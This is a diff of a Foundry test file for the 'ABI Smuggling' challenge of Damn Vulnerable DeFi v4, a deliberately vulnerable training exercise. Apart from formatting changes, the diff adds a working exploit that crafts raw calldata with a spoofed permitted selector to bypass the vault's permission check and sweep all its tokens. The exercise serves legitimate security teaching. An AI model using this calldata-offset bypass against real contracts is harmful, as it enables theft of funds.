@@ -2,15 +2,15 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
+import { Test, console } from "forge-std/Test.sol";
+import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
+import { SelfAuthorizedVault, AuthorizedExecutor, IERC20 } from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
 
 contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -36,8 +36,16 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(
+            hex"85fb709d",
+            deployer,
+            address(vault)
+        );
+        bytes32 playerPermission = vault.getActionId(
+            hex"d9caed12",
+            player,
+            address(vault)
+        );
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -73,7 +81,23 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory attackActionData = abi.encodeCall(
+            vault.sweepFunds,
+            (recovery, IERC20(address(token)))
+        );
+        uint256 baseActionDataOffset = 32 + 32;
+        uint256 attakActionDataOffset = baseActionDataOffset + 32 + 32;
+        bytes memory attackData = abi.encodePacked(
+            vault.execute.selector,
+            bytes32(uint256(uint160(address(vault)))),
+            attakActionDataOffset,
+            bytes32(0),
+            bytes32(hex"d9caed12"), // player's selector to bypass the check
+            attackActionData.length, // 68
+            attackActionData // the real execution data
+        );
+        (bool success, ) = address(vault).call(attackData);
+        assertTrue(success);
     }
 
     /**
@@ -82,6 +106,10 @@ contract ABISmugglingChallenge is Test {
     function _isSolved() private view {
         // All tokens taken from the vault and deposited into the designated recovery account
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
